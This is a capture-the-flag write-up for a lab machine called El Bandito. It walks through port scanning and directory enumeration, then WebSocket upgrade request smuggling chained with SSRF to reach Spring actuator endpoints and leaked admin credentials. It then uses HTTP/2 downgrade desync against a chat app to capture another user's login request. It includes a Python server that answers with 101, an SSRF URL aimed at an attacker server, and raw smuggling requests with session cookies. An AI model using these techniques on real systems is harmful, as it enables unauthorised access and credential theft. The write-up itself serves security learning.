## Nmap
![](Pasted%20image%2020250217042214.png)

On 8080, we are dealing with a Spring Java Framework. No other versions can be detected. The endpoint on Port 80 runs on HTTPS.
```shell
nmap -sC -sV -p 22,80,631,8080 elbandito.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-23 14:56 EDT
Nmap scan report for elbandito.thm (10.10.235.198)
Host is up (0.036s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a8:6a:33:82:85:12:84:14:99:91:30:15:ab:fb:bf:32 (RSA)
|   256 8f:d2:f3:5a:92:14:96:b0:d3:d8:85:89:7e:7b:a9:7c (ECDSA)
|_  256 f6:ed:0d:61:22:66:5b:52:9f:7b:f8:42:6c:50:9c:3f (ED25519)
80/tcp   open  ssl/http El Bandito Server
|_http-server-header: El Bandito Server
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Date: Sat, 23 Mar 2024 18:57:22 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 23 Mar 2024 18:56:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 58
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|     nothing to see <script src='/static/messages.js'></script>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 23 Mar 2024 18:56:31 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 0
|     Allow: OPTIONS, HEAD, GET, POST
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest: 
|_    HTTP/1.1 400 Bad Request
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2021-04-10T06:51:56
|_Not valid after:  2031-04-08T06:51:56
|_ssl-date: TLS randomness does not represent time
631/tcp  open  ipp      CUPS 2.4
|_http-server-header: CUPS/2.4 IPP/2.1
|_http-title: Bad Request - CUPS v2.4.7
8080/tcp open  http     nginx
|_http-favicon: Spring Java Framework     !!!
|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
```


## Enumeration - gobuster
```shell
gobuster dir -u https://elbandito.thm:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k
```

Some interesting findings of port 80 are /messages, /access, /static (/static/messages.js)
	![](Pasted%20image%2020250217042500.png)

```
gobuster dir -u http://elbandito.thm:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

On port 8080 we have a lot more:
	![](Pasted%20image%2020250217042747.png)

8080 is of interest because it offers more directories, we know what kind of framework we are dealing with in the background (**Java Spring Framework**), and the first visit to the index page promises more. 

Accessible pages here are Services and Burn Token.
	![](Pasted%20image%2020250217043106.png)

Burn-token:
	![](Pasted%20image%2020250217043143.png)

Inspecting the page source code we find out that a **WebSocket** is used:
	![](Pasted%20image%2020250217043352.png)


## Request Smuggle via WebSocket

We intercept the request on `burn.html` and see an `HTTP/1.1` WebSocket request in Burp Suite.
	![](Pasted%20image%2020250217043621.png)

Using WebSocket Request Smuggling, we can bypass proxy restrictions. By recalling spring actuator endpoints and the gobuster scan, we could be able to get access to sensitive information by accessing those restricted resources.
	![](Pasted%20image%2020250217050128.png)

- Java Spring acutators: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html

Spring Boot Actuators register endpoints such as `/health`, `/trace`, `/beans`, `/env`, etc. In versions 1 to 1.4, these endpoints are accessible without authentication. From version 1.5 onwards, only `/health` and `/info` are non-sensitive by default, but developers often disable this security.

We can enable request smuggling using WebSocket Upgrade. We create a modified request so that the proxy assumes that a WebSocket upgrade has taken place - for example, with a higher version number, here `777` -, however the version in the backend remains the same. This causes the proxy to create a tunnel between client and server, which is unchecked and perceived as a WebSocket connection, but the backend still expects HTTP traffic.

With this, we are tying to access a restricted resource by specifying an incorrect version number and applying request smuggling, but this does not work here. The server seems to be secured and checks whether the WebSocket upgrade was successful. We are not able to access `/env`, for example.
	![](Pasted%20image%2020250217043931.png)

Since we can't smuggle requests with just a simple malformed request, we need to find a way to fool the proxy into believing that a valid WebSocket connection has been established.

In other words, we have to somehow trick the proxy that the backend web server responds with a `101` Switching Protocols response without actually upgrading the connection in the backend to establish that 'upgrade'. So we are looking for an SSRF to chain the exploits.

We come across `Services` and see an online status for `http://bandito.websocket.thm` and `http://bandito.public.thm`.
	![](Pasted%20image%2020250217044026.png)

If we point to `/isOnline?url=http://attacker-server/` and have a a server, that responds only with 101s, we could make use of this to upgrade our websocket.
	![](Pasted%20image%2020250217045136.png)

Payload (web server that forwards 101 response)
```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

![](Pasted%20image%2020250217045340.png)

Double forward the request and we have the desired prohibited response(tested for `/env`):
	![](Pasted%20image%2020250217045521.png)

Let's try out now for the resource `/trace`, where we find two directories that we did not find in our Gobuster scan and are also not usual for the framework: `/admin-creds` and `/admin-flag`.
	![](Pasted%20image%2020250217045756.png)

On accessing `/admin-creds` we are able to retrieve some credentials, that might have been used for other stuff.
	![](Pasted%20image%2020250217050029.png)


## HTTP/2 Desync

We continue at the web server hosted on port 80, where the index page shows a `nothing to see`, but let's dig more in depth:
	![](Pasted%20image%2020250217050703.png)

Remember that `/static/messages.js` finding on the enumeration phase. Let's inspect that to see what it is about it:
```javascript
document.addEventListener("DOMContentLoaded", function () {
	const discussions = document.querySelectorAll(".discussion");
	const messagesChat = document.querySelector(".messages-chat");
	const headerName = document.querySelector(".header-chat .name");
	const writeMessageInput = document.querySelector(".write-message");
	let userMessages = {
		JACK: [],
		OLIVER: [],
	};

	// Function to fetch messages from the server
	function fetchMessages() {
		fetch("/getMessages")
			.then((response) => {
				if (!response.ok) {
					throw new Error("Failed to fetch messages");
				}
				return response.json();
			})
			.then((messages) => {
				userMessages = messages;/
				userMessages.JACK === undefined
					? (userMessages = { OLIVER: messages.OLIVER, JACK: [] })
					: userMessages.OLIVER === undefined &&
					  (userMessages = { JACK: messages.JACK, OLIVER: [] });

				displayMessages("JACK");
			})
			.catch((error) => console.error("Error fetching messages:", error));
	}

	// Function to display messages for the selected user
	function displayMessages(userName) {
		headerName.innerText = userName;
		messagesChat.innerHTML = "";
		userMessages[userName].forEach(function (messageData) {
			appendMessage(messageData);
		});
	}

	// Function to append a message to the chat area
	function appendMessage(messageData) {
		const newMessage = document.createElement("div");
		console.log({ messageData });
		newMessage.classList.add("message", "text-only");
		newMessage.innerHTML = `
           ${messageData.sender !== "Bot" ? '<div class="response">' : ""}
        <div class="text">${messageData}</div>
    ${messageData.sender !== "Bot" ? "</div>" : ""}
        `;
		messagesChat.appendChild(newMessage);
	}

	// Function to send a message to the server
	function sendMessage() {
		const messageText = writeMessageInput.value.trim();
		if (messageText !== "") {
			const activeUser = headerName.innerText;
			const urlParams = new URLSearchParams(window.location.search);
			const isBot =
				urlParams.has("msg") && urlParams.get("msg") === messageText;

			const messageData = {
				message: messageText,
				sender: isBot ? "Bot" : activeUser, // Set the sender as "Bot"
			};
			userMessages[activeUser].push(messageData);
			appendMessage(messageText);
			writeMessageInput.value = "";
			scrollToBottom();
			console.log({ activeUser });
			fetch("/send_message", {
				method: "POST",
				headers: {
					"Content-Type": "application/x-www-form-urlencoded",
				},
				body: "data="+messageText
			})
				.then((response) => {
					if (!response.ok) {
						throw new Error("Network response was not ok");
					}
					console.log("Message sent successfully");
				})
				.catch((error) => {
					console.error("Error sending message:", error);
					// Handle error (e.g., display error message to the user)
				});
		}
	}

	// Event listeners
	discussions.forEach(function (discussion) {
		discussion.addEventListener("click", function () {
			const userName = this.dataset.name;
			console.log({ userName });
			displayMessages(userName.toUpperCase());
		});
	});

	const sendButton = document.querySelector(".send");
	sendButton.addEventListener("click", sendMessage);
	writeMessageInput.addEventListener("keydown", function (event) {
		if (event.key === "Enter") {
			event.preventDefault();
			sendMessage();
		}
	});

	// Initial actions
	fetchMessages();
});

// Function to scroll to the bottom of the messages chat
function scrollToBottom() {
	const messagesChat = document.getElementById("messages-chat");
	messagesChat.scrollTop = messagesChat.scrollHeight;
}
```

In a nutshell, the JavaScript code manages a chat interface between two users, `JACK` and `OLIVER`. It handles message fetching, displaying, and sending functionalities. Users can switch between `JACK` and `OLIVER`'s messages by clicking on their respective discussion tabs. When sending a message, the code distinguishes between regular user messages and those from a simulated `bot`, which is indicated in the chat interface.

We know about a message board, and about directory `/access`. If we visit this, we get a login mask. We have already harvested 8080 credentials, which we now use here to log in as `hAckLIEN`.
	![](Pasted%20image%2020250217050942.png)

Accessing this page we found a chat  between `hAckLIEN` and `Jack`. We can select the chats between `Jack` and `Oliver`, but there is none with `Oliver`.
	![](Pasted%20image%2020250217051023.png)

Let's take a look at what requests are made when we reload `/messages` and sending messages.
	![](Pasted%20image%2020250217051055.png)

We can send any messages with our session:
	![](Pasted%20image%2020250217051106.png)

All the requests we have made are `HTTP/2` requests. There is not much smuggling possible unless we can downgrade to `HTTP/1.1`. If this is not possible, we only have `HTTP/2` request tunneling as another option. 

Let's switch to `HTTP/1.1` in Burp Suite. And seeing that these requests are also supported is interesting. Perhaps a downgrade is possible.
	![](Pasted%20image%2020250217051208.png)

We receive a `503` backend fetch failed, which tells us that we are dealing with a `Varnish cache server`, which is known to be susceptible for some versions to request smuggling.
	![](Pasted%20image%2020250217051234.png)

We will set the `Content-Length` now to `0`, disable the `Content-Length` update in Burp Suite, and append a second request to **retrieve all the messages after sending a message**. The reply suggests, and confirms, that HTTP Request Smuggling is possible here.
	![](Pasted%20image%2020250217051524.png)

### Downgrade Via H2.CL
We have seen that we can also send `HTTP/1.1` requests successfully and chain requests by setting the `Content-Length` to `0` for the first request. It is very likely that an `HTTP/2` downgrade is possible.

HTTP/2 downgrading occurs when a reverse proxy serves content to the end user with HTTP/2 (front-end connection) but requests it from the back-end servers with HTTP/1.1 (back-end connection). The Content-Length header isn't significant for HTTP/2, as the length of the request body is clearly defined. But a Content-Length header can still be added to an HTTP/2 request. If an HTTP downgrade occurs, the proxy will pass on the added Content-Length header from HTTP/2 to the HTTP/1.1 connection and thus enable desynchronization. The proxy receives the HTTP/2 request on the frontend connection. When translating the request to HTTP/1.1, it simply passes the Content-Length header to the backend connection. The backend web server then reads the request and acknowledges the injected Content-Length as valid, which enables HTTP Request Smuggling.

We switch back to `HTTP/2` in our previously made request to `/send_message` and try our first approach. We set the `Content-Length` to `0` and appended the data smuggled to our `POST` request. The automatic update of the `Content-Length` in Burp Suite has to be disabled.

Approach:
	We have a message board with at least two users and one bot. They may still communicate on this board. The idea is now to intercept the request of one of the users and retrieve sensitive information of the request made.

We can realize this by placing an incomplete `send_message` request on the server, with a sufficient content length. The request of the victim should serve as data, so that it can be posted on the message board, visible to us.

We will adapt our first `send_message` request in the repeater so that we are querying `/`(root page) instead, and afterwards `/send_messages`.
```
POST / HTTP/2                     !!!
Host: elbandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Zf9h6Q._RuzBukkXUAbWkck_BFx4LA4rcc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Length: 0

POST /send_message HTTP/1.1        !!!
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Zf9h6Q._RuzBukkXUAbWkck_BFx4LA4rcc
Host: elbandito.thm:80
Content-Length: 900            !!!
Content-Type: application/x-www-form-urlencoded

data=                     !!!
```

We send our initial request to `/`, using `Content-Length: 0`. We append an incomplete `send_message` request to this request. This way we write the request of another user to our message board. With a sufficient content length of 900 or more, we ensure that everything from the user's request is taken into account as `data` for the message.
	![](Pasted%20image%2020250217052755.png)

As shown below, we send the request described above until the response is delayed and finally returns a `503`.
	![](Pasted%20image%2020250217052851.png)

We then resend it once again and receive a `200` response. It is important here that the content length does not exceed the length of the presumed request of the victim that we want to intercept because if we set the `Content-Length` larger than the request made by the victim then the application will just timeout.
	![](Pasted%20image%2020250217053121.png)

Now we have to wait about 2 minutes for the victim(in our case the bot) to make a request. After that we call `/getMessages` and find the expected response. We catch a login request.
	![](Pasted%20image%2020250217053331.png)
